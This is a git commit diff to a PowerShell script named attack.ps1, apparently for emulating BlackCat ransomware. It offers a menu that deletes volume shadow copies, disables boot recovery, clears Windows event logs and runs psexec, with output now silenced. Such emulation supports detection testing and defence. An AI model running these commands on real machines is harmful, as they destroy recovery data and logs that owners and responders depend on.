5f28b2c492959f5b363126ea2bdc5dae892551fd
chromatic-wolf <53034260+CHROME-PLATED-METRO-WOLF@users.noreply.github.com>
2023-09-23 19:05:46 +1000

    bug fix and testing added

--- shared-folder/attack.ps1
+++ shared-folder/attack.ps1
@@ -1,33 +1,34 @@
 function dissableSystemRecovery() {
     #dissables system recovery methods
-    vssadmin.exe delete shadows / all / quiet
-    wmic.exe Shadowcopy Delete
-    bcdedit /set {default} recoveryenabled No
+    vssadmin.exe delete shadows /all /quiet >$null 2>&1
+    wmic.exe Shadowcopy Delete >$null 2>&1
+    bcdedit /set {default} recoveryenabled No>$null 2>&1
 }
 
 function clearLogs() {
     #loops through all event logs and deletes them
-    wevtutil el | Select-Object -First 2 {wevtutil cl "$_"}
+    wevtutil el | Select-Object -First 2 {wevtutil cl "$_"} >$null 2>&1
 }
 
 function netUse() {
     #simulates using the net use command with persistence turned off
-    net use / persistent: no
+    net use /persistent: no >$null 2>&1
 }
 
 function psExec() {
     #runns the psexec command with - accepteula to simulate blackcat
-    .\PSTools\psexec.exe - accepteula
+    .\PSTools\psexec.exe -accepteula >$null 2>&1
 }
 
-Write - Output "Please select a option"
-Write - Output "1: dissable system recovery"
-Write - Output "2: clear event logs"
-Write - Output "3: run net use"
-Write - Output "4: run psExec"
-Write - Output "exit: exit script"
+Write-Output "Please select a option"
+Write-Output "1: dissable system recovery"
+Write-Output "2: clear event logs"
+Write-Output "3: run net use"
+Write-Output "4: run psExec"
+Write-Output "exit: exit script"
 $option = Read-Host -Prompt "Select your option: "
-
+while ($option -ne "exit")
+{
 
     if ($option -eq "1") 
     {
@@ -51,3 +52,6 @@ $option = Read-Host -Prompt "Select your option: "
     } else {
         Write-Host "Error: Please select a valid option" -ForegroundColor Black -BackgroundColor Red
     }
+$option = Read-Host -Prompt "Select another option: "
+
+}
